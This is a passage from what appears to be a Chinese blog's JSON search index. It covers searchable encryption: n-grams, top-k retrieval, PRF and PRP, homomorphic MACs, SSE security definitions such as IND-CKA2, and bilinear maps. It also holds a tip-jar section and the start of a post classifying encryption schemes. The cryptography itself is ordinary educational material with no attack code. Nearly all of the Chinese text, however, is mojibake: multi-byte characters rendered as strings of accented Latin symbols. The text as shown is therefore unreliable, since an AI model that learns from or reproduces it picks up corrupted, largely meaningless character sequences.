P(æˆ‘) * P(å¸®|æˆ‘) * P(ä½ |å¸®)\n  - {\"æˆ‘å¸®\":1, \"å¸®ä½ \":2, \"ä½ å¸®\":3, \"å¸®æˆ‘\":4}\n  - æˆ‘å¸®ä½ â†’[1,1,0,0]\n  - ä½ å¸®æˆ‘â†’[0,0,1,1]\n- å½“N=3 æ—¶ç§°ä¸º `tri-gram` \n\nä¾‹å¦‚è¾“å…¥ä¸ºè¥¿å®‰äº¤é€šå¤§å­¦\n\n- uni-gram å½¢å¼ä¸ºï¼šè¥¿/å®‰/äº¤/é€š/å¤§/å­¦\n\n- big-ramå½¢å¼ä¸ºï¼š è¥¿å®‰/å®‰äº¤/äº¤é€š/é€šå¤§/å¤§å­¦\n\n- tri-gramå½¢å¼ä¸ºï¼šè¥¿å®‰äº¤/å®‰äº¤é€š/äº¤é€šå¤§/é€šå¤§å­¦\n\nä¸­æ–‡æ–‡æœ¬å¤„ç†å¤§å¤šé‡‡ç”¨ bi-gram è¿›è¡Œåˆ†è§£ï¼Œå› ä¸ºåŒå­—è¯å‡ºç°æ¦‚ç‡æ¯”è¾ƒå¤§ï¼Œå³ä»¥å¤§å°ä¸º2çš„æ»‘åŠ¨çª—å£è¿›è¡Œæ“ä½œï¼Œåˆ‡æˆé•¿åº¦ä¸º 2 çš„å­—èŠ‚ç‰‡æ®µã€‚\n\n------\n\n### 9.Top-kæ£€ç´¢\n\næ—¨åœ¨è·å–ç›¸ä¼¼åº¦åï¼Œå°†å…¶ä½œä¸ºæ‰“åˆ†ç»“æœï¼Œæ ¹æ®åŒ¹é…åˆ°çš„æ–‡ä»¶çš„åˆ†æ•°ï¼ŒæŒ‰ç…§é¡ºåºè¿”å›ç»™ç”¨æˆ·åˆ†æ•°æ’åæœ€é«˜çš„Kä»½æ•°æ®ï¼Œæ˜¯æœç´¢å¼•æ“ä¸­æœ€å¸¸è§çš„æ¨¡å¼ã€‚ç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯ä½¿ç”¨æˆ·å¿«é€Ÿæ‰¾åˆ°æœ€ç›¸å…³çš„ k ä¸ªç»“æœã€‚\n\n### 10.å‘é‡å†…ç§¯(ç‚¹ä¹˜)\n\n- a = [a1,a2,...,an]\n- b = [b1,b2,...bn]\n\na å’Œ b çš„å†…ç§¯å…¬å¼ä¸ºï¼šaâˆ™b = a1b1 + a2b2 + ... + anbn\n\n**å†…ç§¯çš„å‡ ä½•æ„ä¹‰**\n\nå†…ç§¯çš„å‡ ä½•æ„ä¹‰æ˜¯å¯ä»¥ç”¨æ¥è¡¨å¾æˆ–è®¡ç®—ä¸¤ä¸ªå‘é‡ä¹‹é—´çš„å¤¹è§’ï¼Œä»¥åŠåœ¨ b å‘é‡åœ¨ a å‘é‡æ–¹å‘ä¸Šçš„æŠ•å½±ã€‚\n\n### 11.PRF&PRP\n\n> ä¼ªéšæœºå‡½æ•°ï¼ˆPRFï¼‰å’Œç½®æ¢ï¼ˆPRPï¼‰ï¼Œå®ƒä»¬æ˜¯å¤šé¡¹å¼æ—¶é—´å¯è®¡ç®—çš„å‡½æ•°ï¼Œä¸èƒ½è¢«ä»»ä½•å¯èƒ½çš„å¤šé¡¹å¼æ—¶é—´å¯¹æ‰‹ä»éšæœºå‡½æ•°ä¸­åŒºåˆ†å‡ºæ¥ã€‚\n\nPRPï¼ˆpseudo random permutationï¼Œä¼ªéšæœºç½®æ¢ï¼‰å’ŒPRFï¼ˆpseudo random functionï¼Œä¼ªéšæœºå‡½æ•°ï¼‰ä¹‹é—´çš„åŒºåˆ«ï¼Œå¯ä»¥ä»å®šä¹‰æ¥çœ‹\n\n**PRF**\n\n- Fï¼šK Ã— X â†’ Y\n\nå–ä¸€ä¸ªå¯†é’¥å’Œé›†åˆ X ä¸­çš„å…ƒç´ ä½œä¸ºè¾“å…¥ï¼Œè¾“å‡ºå€¼åœ¨é›†åˆ Y ä¸­ï¼Œç°åœ¨å”¯ä¸€è¦æ±‚çš„æ˜¯å­˜åœ¨ä¸€ä¸ªæœ‰æ•ˆçš„ç®—æ³•æ¥å®ç°è¿™ä¸ªå‡½æ•°ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¦æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„å‡½æ•°æ¥å®ç° **K Ã— X â†’ Y** çš„æ˜ å°„ã€‚\n\n**PRP**\n\n- Eï¼šK Ã— X â†’ X\n- å­˜åœ¨æ±‚è§£ E(K,X) çš„é«˜æ•ˆç¡®å®šæ€§ç®—æ³•\n- å‡½æ•° E(k,Â·) æ˜¯ä¸€å¯¹ä¸€çš„\n- å­˜åœ¨é«˜æ•ˆçš„â€œé€†ç®—æ³•â€ D(K,X)\n\nä¸ PRF ä¸åŒçš„æ˜¯ï¼Œå¤šäº†ä¸€ä¸ªæ¡ä»¶ï¼Œé‚£å°±æ˜¯è¦æœ‰ä¸€ä¸ªç®—æ³• D å¯ä»¥å®ç°é€†è¿ç®—ã€‚\n\nåœ¨PRPä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªæœ‰æ•ˆç®—æ³•ï¼Œèƒ½å¤Ÿå®ç° **K Ã— X â†’ X** æ˜ å°„å…³ç³»ï¼Œä¹Ÿå°±æ˜¯è¯´è¯¥ç®—æ³•èƒ½å¤Ÿå°†éšæœºå¯†é’¥ K ä¸é›†åˆ X ä¸­çš„å…ƒç´ ä½œä¸ºè¾“å…¥ï¼ŒåŒæ—¶è¾“å‡ºå€¼ä¹Ÿæ˜¯é›†åˆ X ä¸­çš„å…ƒç´ ï¼Œé‚£ä¹ˆå°±è¦æ±‚æ¯ä¸ªå…ƒç´ ä¸€ä¸€å¯¹åº”ã€‚ä»æœ¬è´¨ä¸Šæ¥è¯´ï¼ŒE(K,X) æ˜¯å¯¹å…ƒç´  x çš„ç½®æ¢ï¼Œä¸ºäº†è§£å¯†çš„éœ€è¦ï¼Œå°±è¦æ±‚ E æ˜¯å¯é€†çš„ã€‚\n\n### 12.Homomorphic MAC\n\nåŒæ€MACï¼šä»»ä½•æ¶ˆæ¯ m<sub>i</sub> è¢«åŠ å¯†ä¸ºä¸€ä¸ª degree-1 å¤šé¡¹å¼ y(x)\n\n- å³ y(0) = m<sub>i</sub> å’Œ y(Î±) = Î³<sub>i</sub>ï¼Œå…¶ä¸­ Î± å’Œ Î³<sub>i</sub> åªæœ‰éªŒè¯è€…çŸ¥é“\n- å³ y(x) = m<sub>i</sub> + ( Î³<sub>i</sub> âˆ’m<sub>i</sub>)âˆ™x/Î± æˆç«‹ã€‚\n- ç”±äºäº‘æœåŠ¡å™¨åœ¨è®¡ç®—å‡½æ•° f æ—¶éœ€è¦è¿›è¡Œä¸€äº›åŸºæœ¬çš„ç®—æœ¯è¿ç®—ï¼Œå› æ­¤éœ€è¦å¼•å…¥åŒæ€åŠ å¯†ï¼Œå¯¹åŠ å¯†åçš„æ•°æ®è¿›è¡Œç›´æ¥è®¡ç®—ã€‚\n  - f(Î³<sub>1</sub>,Â·Â·Â·, Î³<sub>n</sub>) = y(Î±)    ---â‘ \n  - f(m<sub>1</sub> ,Â·Â·Â·, m<sub>n</sub>) = y(0) ---â‘¡\n- åœ¨æ–¹ç¨‹â‘ å»ºç«‹çš„æ¡ä»¶ä¸‹ï¼ŒéªŒè¯å™¨å¯ä»¥éªŒè¯æ–¹ç¨‹â‘¡ã€‚å› æ­¤ï¼Œè¯¥æŠ€æœ¯å¯ä»¥éªŒè¯äº‘æœåŠ¡å™¨æ˜¯å¦è¯šå®åœ°æ‰§è¡Œç”¨æˆ·å®šä¹‰çš„æœç´¢ç®—æ³•\n\nç”±äºä¼ ç»ŸåŒæ€ MAC ä»…æ”¯æŒæœ‰é™åŸŸçš„è®¡ç®—ï¼Œè®ºæ–‡ VRFMS é‡‡ç”¨äº† realhomm-MACï¼Œrealhomm-MAC çš„æ”¹è¿›æ˜¯å°†æ‰€æœ‰æ¶ˆæ¯ä½œä¸ºå®æ•°æ¥å¤„ç†ï¼Œå…¶ç¼–ç æ ¼å¼ç±»ä¼¼äº IEEE 754 æ ‡å‡†ä¸­å®šä¹‰çš„åŒç²¾åº¦æµ®ç‚¹æ ¼å¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–°ç®—æ³•åœ¨ä¿ç•™åŸç®—æ³•åŒæ€çš„å‰æä¸‹èƒ½å¤Ÿå¤„ç†å®æ•°ã€‚\n\n### 13.SSEå®‰å…¨æ€§\n\nKPA<IND-SCKA<IND-CKA<IND-CKA2\n\n**KPA**\n\n- Known Plaintext Attack\n\n- çŸ¥é“éƒ¨åˆ†çš„æ˜æ–‡å’Œå¯†æ–‡å¯¹ï¼Œæ¨å‡ºå¯†é’¥å’ŒåŠ å¯†ç®—æ³•\n\n![](../images/å¯æœç´¢åŠ å¯†ï¼šåŸºç¡€çŸ¥è¯†/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0EzMzI4MDAwMGY=,size_16,color_FFFFFF,t_70.png)\n\n**SCKA**\n\n- selectivelychosen-keyword attack\n\n- é€‰æ‹©æ€§å…³é”®å­—æ”»å‡»\n\n- å®ƒä¸èƒ½ä¿è¯è°“è¯çš„ç§å¯†æ€§ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥é€šè¿‡ç”Ÿæˆä»»æ„çš„æ˜æ–‡-å¯†æ–‡ç´¢å¼•å¯¹ ä»é™·é—¨ä¸­æ¨æ–­å‡ºæŸ¥è¯¢å…³é”®å­—ã€‚\n\n**IND-CKA1** \n\n- indistinguishability against chosen keyword attack\n- é’ˆå¯¹é€‰æ‹©å…³é”®å­—æ”»å‡»çš„ä¸å¯åŒºåˆ†æ€§\n- ä¿è¯æ–‡æ¡£å†…å®¹ä¸ä¼šè¢«å»ºç«‹åœ¨å…¶ä¸Šçš„ç´¢å¼•ä»¥åŠå…¶ä»–æ–‡æ¡£çš„ç´¢å¼•æ³„æ¼\n\nIND-CKA2\n\n- adaptively chosen-keyword attack\n- è‡ªé€‚åº”é€‰æ‹©å…³é”®å­—æ”»å‡»\n- è‡ªé€‚åº”æ”»å‡»æ¨¡å‹ä¸‹æ»¡è¶³æŠµæŠ—é€‰æ‹©æ€§æ˜æ–‡æ”»å‡»çš„å®‰å…¨ä¸ºCKA2\n\n- å¯¹æ‰‹æ ¹æ®å…ˆå‰é€‰æ‹©çš„æŸ¥è¯¢åŠå…¶é™·é—¨å’Œæœç´¢ç»“æœè‡ªé€‚åº”åœ°é€‰æ‹©æœªæ¥çš„æ¯ä¸ªæŸ¥è¯¢ã€‚å¦‚æœæ²¡æœ‰æ¦‚ç‡å¤šé¡¹å¼æ—¶é—´ï¼ˆPPTï¼‰å¯¹æ‰‹èƒ½å¤Ÿä»¥ä¸å¯å¿½ç•¥çš„ä¼˜åŠ¿åŒºåˆ†çœŸå®é¡¹ç›®å’Œæ¨¡æ‹Ÿé¡¹ç›®ï¼Œåˆ™è¯¥æ–¹æ¡ˆæ˜¯è‡ªé€‚åº”å®‰å…¨çš„ï¼Œè¿™æ˜¯è¿„ä»Šä¸ºæ­¢åŸºäºSSEçš„å…³é”®å­—æœç´¢æœ€å¼ºå¤§çš„å®‰å…¨æ¨¡å‹ã€‚\n\nå‚è€ƒï¼šåœ¨ [å¯æœç´¢çš„å¯¹ç§°åŠ å¯†ï¼šæ”¹è¿›çš„å®šä¹‰å’Œæœ‰æ•ˆçš„æ„é€ ](https://dl.acm.org/doi/abs/10.1145/1180405.1180417?casa_token=9_Hd9p-Sz3sAAAAA:exvY5ztMhWxLalHYBWhqHRZ_Rf54MMJf17PV5mgJMnGNDWtQNBlPD6jP34jUEyojdSFXAer7F23u) ä¸­ï¼ŒCurtmola ç­‰äººã€‚ä¸ºå¯æœç´¢çš„åŠ å¯†æ–¹æ¡ˆæå‡ºéè‡ªé€‚åº”å’Œè‡ªé€‚åº”ï¼ˆä¸å¯åŒºåˆ†æ€§å’ŒåŸºäºæ¨¡æ‹Ÿå™¨ï¼‰çš„å®‰å…¨å®šä¹‰ï¼Œé€šå¸¸ç§°ä¸ºIND-CKA1 å’ŒIND-CKA2ã€‚\n\n### 14.åŒçº¿æ€§æ˜ å°„\n\n> 1946å¹´åŒçº¿æ€§å¯¹é¦–å…ˆè¢«æ³•å›½æ•°å­¦å®¶Weilæå‡ºå¹¶æˆä¸ºä»£æ•°å‡ ä½•é¢†åŸŸé‡è¦çš„æ¦‚å¿µå’Œç ”ç©¶å·¥å…·ã€‚\n\nåŒçº¿æ€§æ˜ å°„å¯ä»¥ç”¨äº”å…ƒç»„ (p,G1,G2,GT,e) æ¥æè¿°ï¼ŒG1ï¼ŒG2ï¼ŒGT æ˜¯ä¸‰ä¸ªç´ æ•°é˜¶ä¹˜æ³•å¾ªç¯ç¾¤ï¼Œé˜¶æ•°çš†ä¸ºpï¼Œå®šä¹‰åœ¨è¿™ä¸‰ä¸ªç¾¤ä¸Šçš„ä¸€ä¸ªæ˜ å°„å…³ç³»eï¼šG1*G2 â€”>GTï¼Œæ»¡è¶³ä»¥ä¸‹æ€§è´¨ï¼š \n\n1ã€åŒçº¿æ€§æ€§ï¼šå¯¹äºä»»æ„aï¼Œb âˆˆ Z<sub>p</sub> å’Œ Rï¼ŒS âˆˆ G<sub>1</sub>ï¼Œæœ‰e(R<sup>a</sup>, S<sup>b</sup>) = e(R, S)<sup>ab</sup>ï¼›\n\n2ã€éé€€åŒ–æ€§ï¼šå­˜åœ¨Rï¼ŒS âˆˆ  G<sub>1</sub>ï¼Œä½¿å¾— e(R, S) â‰  1<sub>G<sub>2</sub></sub>ï¼ˆ1<sub>G<sub>2</sub></sub>ä»£è¡¨G<Sub>2</sub>ç¾¤çš„å•ä½å…ƒï¼‰ï¼›\n\n3ã€å¯è®¡ç®—æ€§ï¼šå­˜åœ¨æœ‰æ•ˆçš„ç®—æ³•å¯¹ä»»æ„çš„ Rï¼ŒS âˆˆ  G<sub>1</sub>ï¼Œè®¡ç®—e(R, S)çš„å€¼ã€‚\n\nå¦‚æœG1=G2åˆ™ç§°ä¸Šè¿°åŒçº¿æ€§é…å¯¹æ˜¯å¯¹ç§°çš„ï¼Œå¦åˆ™æ˜¯éå¯¹ç§°çš„ã€‚\n\n\n\n[åŒçº¿æ€§å¯¹åœ¨å¯†ç å­¦ä¸­çš„åº”ç”¨ï¼ˆä¸Šï¼‰](https://mp.weixin.qq.com/s?__biz=Mzg2MDA2NzQwNw==&mid=2247483915&idx=1&sn=eaa67a4332c97d7c66906825ec5a0907&chksm=ce2d412bf95ac83dd2900defe103e654e39ee1fabf2655303cd1b724d7fb0bed0e5a10a74e25&scene=21#wechat_redirect)\n\n[åŒçº¿æ€§å¯¹åœ¨å¯†ç å­¦ä¸­çš„åº”ç”¨ï¼ˆä¸‹ï¼‰](https://mp.weixin.qq.com/s?__biz=Mzg2MDA2NzQwNw==&mid=2247483942&idx=1&sn=22a33eee26f8eb24a03b5ce394afe714&chksm=ce2d4106f95ac8101f921eef1e9140c66a574f0d438d5c54b7d4f886b7f13961532505a0c6c2&cur_album_id=1603503752706080773&scene=189#wechat_redirect)\n\n\n\n## Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["å¯æœç´¢åŠ å¯†"],"categories":["Crypto"]},{"title":"å¯æœç´¢åŠ å¯†ï¼šå‰ä¸–ä»Šç”Ÿ","url":"/posts/41049.html","content":"\næœ¬ç¯‡æ–‡ç« ä»¥å°ç®€çœ‹è¿‡çš„æ–‡çŒ®ä»¥åŠæŸ¥é˜…çš„èµ„æ–™ä¸ºåŸºç¡€ï¼Œå½’çº³å’Œæ€»ç»“äº†**å¯æœç´¢åŠ å¯†**(Searchable Encryptionï¼ŒSE)çš„ç›¸å…³çŸ¥è¯†ç‚¹ã€‚\n\n## SEä»‹ç»\n\n> ä»¥ä¸‹å†…å®¹æ˜¯å°ç®€é˜…è¯»å¯æœç´¢åŠ å¯†çš„ä¸¤ç¯‡ç»¼è¿°è®ºæ–‡æ‰€æ€»ç»“ï¼Œè®ºæ–‡ä»‹ç»å¦‚ä¸‹\n\n| åºå· | è®ºæ–‡åç§°                                          | ä½œè€…  <br/>å¹´ä»½    | å•ä½         | æ¥æº                                         | é“¾æ¥                                                         |\n| ---- | ------------------------------------------------- | ------------------ | ------------ | -------------------------------------------- | ------------------------------------------------------------ |\n| 1    | Survey on the Searchable Encryption               | æç»çº¬        2015 | å—å¼€å¤§å­¦     | Journal of Software                          | [åŸæ–‡](http://www.jos.org.cn/html/2015/1/4700.htm#outline_anchor_3) |\n| 2    | Research Advances on Secure Searchable Encryption | è‘£æ™“è•¾  2017       | åä¸œå¸ˆèŒƒå¤§å­¦ | Journal of Computer Research and Development | [åŸæ–‡](https://crad.ict.ac.cn/CN/10.7544/issn1000-1239.2017.20170627) |\n\n**å¯æœç´¢åŠ å¯†**(SE)ï¼šæ—¨åœ¨å°†æ•°æ®æ–‡ä»¶è¿›è¡ŒåŠ å¯†åå­˜å‚¨åˆ°äº‘ç«¯ï¼Œç„¶åå¯¹å¯†æ–‡è¿›è¡Œæ£€ç´¢çš„ä¸€ç§æŠ€æœ¯ã€‚\n\nä¾‹å¦‚ï¼šç”¨æˆ·ä¸ºèŠ‚çº¦è‡ªèº«çš„èµ„æºå¼€é”€ï¼Œå°†æ–‡ä»¶å¤–åŒ…ç»™äº‘æœåŠ¡å™¨ï¼Œä½†åˆä¸æƒ³äº‘æœåŠ¡çŸ¥é“å­˜å‚¨çš„æ–‡ä»¶å†…å®¹ï¼Œå› æ­¤éœ€è¦å¯¹æ–‡ä»¶é‡‡ç”¨æŸç§åŠ å¯†æ–¹å¼åŠ å¯†åå­˜å‚¨ã€‚æ­¤å¤–ï¼Œç”¨æˆ·è‹¥æƒ³ä»äº‘æœåŠ¡å™¨ä¸­æŸ¥è¯¢æ–‡ä»¶ä¸­çš„ç‰¹å®šæ•°æ®ï¼Œåªæœ‰åˆæ³•çš„ç”¨æˆ·åŸºäºå…³é”®è¯æ£€ç´¢å¯¹åº”çš„å¯†æ–‡æ•°æ®ã€‚\n\n**å¯æœç´¢åŠ å¯†è§£å†³ä¸¤ç±»åŸºæœ¬é—®é¢˜ï¼š**\n\n- â‘  ä¸å¯ä¿¡èµ–æœåŠ¡å™¨çš„å­˜å‚¨é—®é¢˜\n\n- â‘¡ ä¸å¯ä¿¡èµ–æœåŠ¡å™¨çš„è·¯ç”±é—®é¢˜\n\n## SEè¿‡ç¨‹\n\n- **â‘ åŠ å¯†è¿‡ç¨‹**ã€‚ç”¨æˆ·ä½¿ç”¨å¯†é’¥åœ¨æœ¬åœ°å¯¹æ˜æ–‡æ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼Œå¹¶å°†å…¶ä¸Šä¼ è‡³æœåŠ¡å™¨ã€‚\n\n- **â‘¡é™·é—¨ç”Ÿæˆè¿‡ç¨‹**ã€‚å…·å¤‡æ£€ç´¢èƒ½åŠ›çš„ç”¨æˆ·ï¼Œä½¿ç”¨å¯†é’¥ç”Ÿæˆå¾…æŸ¥è¯¢å…³é”®è¯çš„é™·é—¨ï¼Œè¦æ±‚é™·é—¨ä¸èƒ½æ³„éœ²å…³é”®è¯çš„ä»»ä½•ä¿¡æ¯ã€‚\n\n- **â‘¢æ£€ç´¢è¿‡ç¨‹**ã€‚æœåŠ¡å™¨ä»¥å…³é”®è¯é™·é—¨ä¸ºè¾“å…¥ï¼Œæ‰§è¡Œæ£€ç´¢ç®—æ³•ï¼Œè¿”å›æ‰€æœ‰åŒ…å«è¯¥é™·é—¨å¯¹åº”å…³é”®è¯çš„å¯†æ–‡æ–‡ä»¶ï¼Œè¦æ±‚æœåŠ¡å™¨é™¤äº†èƒ½çŸ¥é“å¯†æ–‡æ–‡ä»¶æ˜¯å¦åŒ…å«æŸä¸ªç‰¹å®šå…³é”®è¯å¤–ï¼Œæ— æ³•è·å¾—æ›´å¤šä¿¡æ¯ã€‚\n\n- **â‘£è§£å¯†è¿‡ç¨‹**ã€‚ç”¨æˆ·ä½¿ç”¨å¯†é’¥è§£å¯†æœåŠ¡å™¨è¿”å›çš„å¯†æ–‡æ–‡ä»¶ï¼Œè·å¾—æŸ¥è¯¢ç»“æœã€‚\n\n![å¯æœç´¢åŠ å¯†è¿‡ç¨‹](https://img.jwt1399.top/img/4700-1.jpg)\n\n## SEåˆ†ç±»\n\n### æŒ‰ç…§åº”ç”¨æ¨¡å‹åˆ†ç±»\n\n- **â‘ ä¸€å¯¹ä¸€æ¨¡å¼**\n  - ç”¨æˆ·åŠ å¯†ä¸ªäººæ–‡ä»¶å¹¶å°†å…¶å­˜å‚¨åˆ°ä¸å¯ä¿¡çš„æœåŠ¡å™¨ã€‚åªæœ‰è¯¥ç”¨æˆ·å…·å¤‡åŸºäºå…³é”®è¯æ£€ç´¢çš„èƒ½åŠ›ï¼ŒæœåŠ¡å™¨æ— æ³•è·å–æ˜æ–‡æ–‡ä»¶å’Œå¾…æ£€ç´¢å…³é”®è¯çš„ä¿¡æ¯ã€‚\n  - ![](https://img.jwt1399.top/img/image-20220118220209026.png)\n- **â‘¡å¤šå¯¹ä¸€æ¨¡å¼**\n  - å¤šä¸ªå‘é€è€…åŠ å¯†æ–‡ä»¶åï¼Œå°†å…¶ä¸Šä¼ è‡³ä¸å¯ä¿¡çš„æœåŠ¡å™¨ï¼Œä»¥è¾¾åˆ°ä¸å•ä¸ªæ¥æ”¶è€…ä¼ é€æ•°æ®çš„ç›®çš„ã€‚åªæœ‰æ¥æ”¶è€…å…·å¤‡åŸºäºå…³é”®è¯æ£€ç´¢çš„èƒ½åŠ›ï¼ŒæœåŠ¡å™¨æ— æ³•è·å–æ˜æ–‡æ–‡ä»¶ä¿¡æ¯ï¼Œä¸åŒäºå•ç”¨æˆ·æ¨¡å‹ï¼Œå¤šå¯¹ä¸€æ¨¡å¼è¦æ±‚å‘é€è€…å’Œæ¥æ”¶è€…ä¸èƒ½æ˜¯åŒä¸€ç”¨æˆ·ã€‚\n  - ![](https://img.jwt1399.top/img/image-20220118220352910.png)\n- **â‘¢ä¸€å¯¹å¤šæ¨¡å¼**\n  - å•ä¸ªå‘é€è€…å°†åŠ å¯†æ–‡ä»¶ä¸Šä¼ è‡³ä¸å¯ä¿¡æœåŠ¡å™¨ï¼Œç„¶åå¤šä¸ªæ¥æ”¶è€…å…±äº«æ•°æ®ã€‚\n  - ![](https://img.jwt1399.top/img/image-20220118220412515.png)\n- **â‘£å¤šå¯¹å¤šæ¨¡å¼**\n  - åœ¨å¤šå¯¹ä¸€æ¨¡å¼çš„åŸºç¡€ä¸Šï¼Œä»»æ„ç”¨æˆ·éƒ½å¯æˆä¸ºæ¥å—è€…ï¼Œé€šè¿‡è®¿é—®æ§åˆ¶å’Œè®¤è¯ç­–ç•¥åï¼Œå…·å¤‡å…³é”®è¯çš„å¯†æ–‡æ£€ç´¢æ–¹å¼æå–å…±äº«æ–‡ä»¶çš„èƒ½åŠ›ã€‚åªæœ‰åˆæ³•çš„ç”¨æˆ·å…·å¤‡åŸºäºå…³é”®è¯æ£€ç´¢çš„èƒ½åŠ›ï¼ŒæœåŠ¡å™¨æ— æ³•è·å–æ˜æ–‡æ–‡ä»¶ä¿¡æ¯ï¼Œå…·å¤‡å¹¿é˜”çš„åº”ç”¨å‰æ™¯ã€‚\n  - ![](https://img.jwt1399.top/img/image-20220118220425565.png)\n\n### æŒ‰ç…§è§£å†³ç­–ç•¥åˆ†ç±»\n\n- **â‘ å¯¹ç§°å¯æœç´¢åŠ å¯†**(Symmetric searchable encryption, SSE)\n  - æ—¨åœ¨åŠ è§£å¯†è¿‡ç¨‹ä¸­é‡‡ç”¨ç›¸åŒçš„å¯†é’¥ä¹‹å¤–ï¼Œé™·é—¨ç”Ÿæˆä¹Ÿéœ€è¦å¯†é’¥çš„å‚ä¸ï¼Œé€šå¸¸é€‚ç”¨äºå•ç”¨æˆ·æ¨¡å‹ï¼Œå…·æœ‰è®¡ç®—å¼€é”€å°ã€ç®—æ³•ç®€å•ã€é€Ÿåº¦å¿«çš„ç‰¹ç‚¹ã€‚\n- **â‘¡éå¯¹ç§°å¯æœç´¢åŠ å¯†**(Asymmetric searchable encryption, ASE)\n  - æ—¨åœ¨åŠ è§£å¯†è¿‡ç¨‹ä¸­é‡‡ç”¨å…¬é’¥å¯¹æ˜æ–‡ä¿¡æ¯åŠ å¯†å’Œç›®æ ‡å¯†æ–‡çš„æ£€ç´¢ï¼Œç§é’¥ç”¨äºè§£å¯†å¯†æ–‡ä¿¡æ¯å’Œç”Ÿæˆå…³é”®è¯é™·é—¨ã€‚éå¯¹ç§°å¯æœç´¢åŠ å¯†ç®—æ³•é€šå¸¸è¾ƒä¸ºå¤æ‚ï¼ŒåŠ è§£å¯†é€Ÿåº¦è¾ƒæ…¢ï¼Œå…¶å…¬ç§é’¥ç›¸äº’åˆ†ç¦»çš„ç‰¹ç‚¹ï¼Œéå¸¸é€‚ç”¨äºç§é’¥ç”Ÿæˆå¾…æ£€ç´¢å…³é”®è¯é™·é—¨ï¼Œé€šå¸¸é€‚ç”¨äºå¤šå¯¹ä¸€æ¨¡å‹ã€‚\n- **â‘¢å¯¹ç§°+éå¯¹ç§°å¯æœç´¢åŠ å¯†**\n  - ç”±äºéå¯¹ç§°SEæœ¬èº«æ”¯æŒæœ€åŸºæœ¬å½¢å¼çš„éšç§æ•°æ®å…±äº«ï¼Œå¯é€šè¿‡å…±äº«å¯†é’¥æ‹“å±•åˆ°å¤šå¯¹å¤šçš„åº”ç”¨åœºæ™¯ã€‚å¯¹ç§°SEè™½ç„¶ä½¿ç”¨å•ç”¨æˆ·æ¨¡å‹ï¼Œä½†è®¡ç®—å¼€é”€å°ã€é€Ÿåº¦å¿«ï¼Œæ›´é€‚ç”¨äºå¤§å‹æ–‡ä»¶æ•°æ®çš„åŠ å¯†å’Œå…±äº«ã€‚é€šè¿‡æ··åˆåŠ å¯†ä¸åŸºäºå±æ€§åŠ å¯†æŠ€æœ¯ç›¸ç»“åˆï¼Œæˆ–ä¸ä»£ç†é‡åŠ å¯†ç»“åˆï¼Œä¹Ÿå¯æ„é€ å…±äº«æ–¹æ¡ˆã€‚\n- **â‘£å±æ€§åŸºåŠ å¯†**(Attribute-based encryption, ABE)\n  - å®ƒæ˜¯æŒ‡é€šè¿‡å¯¹ç”¨æˆ·ç§é’¥è®¾ç½®å±æ€§é›†(æˆ–è®¿é—®ç»“æ„ï¼‰ä¸ºæ•°æ®å¯†æ–‡è®¾ç½®è®¿é—®ç»“æ„ï¼ˆæˆ–å±æ€§é›†ï¼‰ï¼Œç”±å±æ€§é›†å’Œè®¿é—®ç»“æ„ä¹‹é—´çš„åŒ¹é…å…³ç³»ç¡®å®šå…¶è§£å¯†èƒ½åŠ›ã€‚ç‰¹åˆ«æ˜¯å¯†æ–‡ç­–ç•¥çš„å±æ€§åŸºåŠ å¯†ï¼ˆCP-ABEï¼‰ï¼Œå…¶å¯†æ–‡ä¸Šçš„è®¿é—®ç­–ç•¥æœ¬èº«å°±æ˜¯ä¸€ç§æœç´¢ç­–ç•¥ï¼Œè®¿é—®ç­–ç•¥çš„è¡¨è¾¾èƒ½åŠ›ä»ä¸€å®šç¨‹åº¦ä¸Šåæ˜ äº†å¯æœç´¢èƒ½åŠ›ã€‚\n\n### æŒ‰ç…§å…³é”®è¯æ•°åˆ†ç±»\n\n- **â‘ å•å…³é”®è¯æœç´¢**ï¼šæ—¨åœ¨ç”¨æˆ·åœ¨æ£€ç´¢çš„è¿‡ç¨‹ä¸­ä½¿ç”¨å•å…³é”®è¯è¿›è¡Œæ£€ç´¢ã€‚\n- **â‘¡å¤šå…³é”®è¯æœç´¢**ï¼šæ—¨åœ¨ç”¨æˆ·åœ¨æ£€ç´¢çš„è¿‡ç¨‹ä¸­ä½¿ç”¨å¤šä¸ªå…³é”®è¯è¿›è¡Œæ£€ç´¢ã€‚\n\n### æŒ‰ç…§æ£€ç´¢ç²¾åº¦åˆ†ç±»\n\n- **â‘ ç²¾ç¡®æœç´¢**ï¼šæ—¨åœ¨æœç´¢çš„è¿‡ç¨‹ä¸­ï¼Œåªæœ‰å½“è¾“å…¥çš„å…³é”®è¯å®Œå…¨ç­‰äºæ–‡ä»¶çš„ç´¢å¼•å€¼æ—¶æ‰èƒ½æ£€ç´¢å‡ºç»“æœã€‚\n- 